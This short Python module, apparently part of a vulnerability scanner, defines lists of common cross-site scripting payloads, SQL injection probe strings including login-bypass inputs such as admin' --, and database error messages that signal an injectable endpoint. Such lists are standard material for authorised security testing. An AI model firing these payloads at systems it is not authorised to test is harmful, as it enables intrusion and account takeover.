"""
Payloads comuns para testes de vulnerabilidades
"""

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    "javascript:alert('XSS')",
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "1' OR '1'='1",
    '1" OR "1"="1',
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "admin' --",
    "admin' #",
    "' OR '1'='1",
]

# Padrões de resposta que podem indicar vulnerabilidades
SQL_ERROR_PATTERNS = [
    "SQL syntax",
    "mysql_fetch_array",
    "ORA-01756",
    "MySQL Error",
    "SQLSTATE[",
    "PostgreSQL ERROR",
    "SQLite3::",
]
